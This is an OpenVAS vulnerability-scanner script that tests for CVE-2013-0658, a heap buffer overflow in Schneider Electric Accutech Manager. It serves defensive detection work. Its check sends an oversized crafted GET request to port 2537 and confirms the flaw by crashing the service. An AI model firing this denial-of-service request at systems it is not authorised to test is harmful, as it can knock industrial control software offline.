###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_se_accutech_manager_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Schneider Electric Accutech Manager Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  code or cause the application to crash, creating a denial-of-service
  condition.
  Impact Level: System/Application";

tag_affected = "Schneider Electric Accutech Manager version 2.00.1 and prior.";
tag_insight = "The flaw is caused by an unspecified error, which can be exploited to
  cause a heap-based buffer overflow by sending a specially crafted GET
  request with more than 260 bytes to TCP port 2537.";
tag_solution = "No solution or patch is available as of 11th February, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.schneider-electric.com/site/home/index.cfm/ww/";
tag_summary = "The host is running Schneider Electric Accutech Manager and is
  prone to buffer overflow vulnerability.";

if(description)
{
  script_id(803170);
  script_version("$Revision: 11 $");
  script_bugtraq_id(57651);
  script_cve_id("CVE-2013-0658");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-02-11 19:51:40 +0530 (Mon, 11 Feb 2013)");
  script_name("Schneider Electric Accutech Manager Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/89691");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52034");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24474");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/52034");

  script_description(desc);
  script_summary("Check if Schneider Electric Accutech Manager is vulnerable to BOF");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(2537);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
banner = "";
port = 2537;

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
## Application specific response is not available
banner = get_http_banner(port: port);
if(!banner){
  exit(0);
}

## Construct attack request
req = http_get(item:string("/",crap(500)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);
sleep(1);

## Confirm Schneider Electric Accutech Manager Server is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
